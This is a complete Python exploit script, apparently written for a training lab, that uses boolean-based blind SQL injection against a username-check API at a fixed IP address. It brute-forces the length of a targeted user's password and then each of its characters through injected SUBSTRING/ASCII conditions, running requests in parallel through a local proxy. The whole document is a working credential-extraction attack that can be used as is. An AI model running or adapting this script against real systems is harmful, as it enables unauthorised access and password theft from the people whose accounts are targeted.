#!/usr/bin/python3

import requests
import json
import sys
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed

# The user we are targeting
target = "maria"

# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    p = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(
        f"http://10.129.204.197/api/check-username.php?u={p}", proxies=proxy)
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Get the target's password length
def get_length():
    length = 0
    while not oracle(f"LEN(password)={length}"):
        length += 1
    return length

# Worker function to check each character
def check_char(i, c):
    return i, oracle(f"ASCII(SUBSTRING(password,{i},1))={c}")

# Dump the target's password
def dump_password(length):
    password = [""] * length
    with ThreadPoolExecutor(max_workers=10) as executor:
        for i in range(1, length + 1):
            futures = {executor.submit(check_char, i, c): c for c in range(32, 127)}
            for future in as_completed(futures):
                index, result = future.result()
                if result:
                    password[index - 1] = chr(futures[future])
                    print(f"[*] Current password: {''.join(password)}")
                    break
    return ''.join(password)

# Main execution
if __name__ == "__main__":
    length = get_length()
    print(f"[*] Password length = {length}")
    password = dump_password(length)
    print(f"[*] Password = {password}")
